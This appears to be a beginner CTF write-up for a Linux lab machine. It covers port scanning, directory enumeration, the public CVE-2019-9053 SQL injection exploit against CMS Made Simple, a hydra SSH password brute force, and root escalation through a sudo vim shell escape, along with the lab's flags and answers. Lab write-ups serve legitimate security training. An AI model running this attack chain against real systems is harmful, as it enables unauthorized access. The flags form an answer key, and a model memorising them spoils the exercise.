# Simple CTF Writeup

> Machine : Linux

> Beginner level ctf

## Solution

First thing is reconnaissance and port scanning.

```shell
nmap -sV -sC -Pn --open 10.128.134.213 -p-
```

From our results, we can see ports 21 (FTP), 80 (HTTP), and 2222 (SSH) are open.

> How many services are running under port 1000?
> 
> 2

> What is running on the higher port?
> 
> SSH

Because port 80 (HTTP) is open, let’s try the target IP in a web browser.

We see the default Apache2 page.
Let's try `gobuster` to enumerate hidden directories.

```shell
gobuster dir -u http://10.128.134.213/ -w /usr/share/wordlists/dirb/common.txt
```

We see that there is a directory named `/simple`.
After browse it, we can see the site is powered by `CMS Made Simple` with `version 2.2.8`. Let’s search this in Exploit-DB for any vulnerabilities.

We could see the version matches to a SQL injection vulnerability.

> What’s the CVE you’re using against the application?
> 
> CVE-2019–9053

> To what kind of vulnerability is the application vulnerable?
> 
> SQLi

After downloading the exploit.

```shell
python2 /home/olid/Downloads/46635.py
```

```text
[+] Specify an url target
[+] Example usage (no cracking password): exploit.py -u http://target-uri
[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist
[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based.
```

```shell
python2 /home/olid/Downloads/46635.py -u http://10.128.134.213/simple/ --crack -w /usr/share/wordlists/rockyou.txt
```

The script can find the user `mitch`, but he can't find the password in clear text.

Because we know the port 22 (SSH) is open, we can use the user and brute force the password to enter.

```shell
hydra -l mitch -P /usr/share/wordlists/rockyou.txt ssh://10.128.134.213:2222/
```

```text
[2222][ssh] host: 10.82.190.209 login: mitch password: secret
```

> What’s the password?
> 
> secret

> Where can you login with the details obtained?
> 
> SSH

```shell
ssh mitch@10.128.134.213 -p 2222
```

```shell
whoami
id
ls
```

```shell
cat user.txt
```

```text
G00d j0b, keep up!
```

> What’s the user flag?
> 
> G00d j0b, keep up!

Now let's see the users on the system.

```shell
ls /home/
```

```text
mitch  sunbath
```

> Is there any other user in the home directory? What’s its name?
> 
> sunbath

Now let's try if we can be root.

```shell
sudo -l
```

```text
User mitch may run the following commands on Machine:
	(root) NOPASSWD: /usr/bin/vim
```

That's means that we can run vim as root.
So let’s check out `GTFOBins` and see if we can use that for privilege escalation.

```
sudo vim -c ':!/bin/sh'
```

> What can you leverage to spawn a privileged shell?
> 
> vim

```shell
whoami
id
ls
```

```shell
cat root.txt
```

```text
W3ll d0n3. You made it!
```

> What's the root flag?
> 
> W3ll d0n3. You made it!

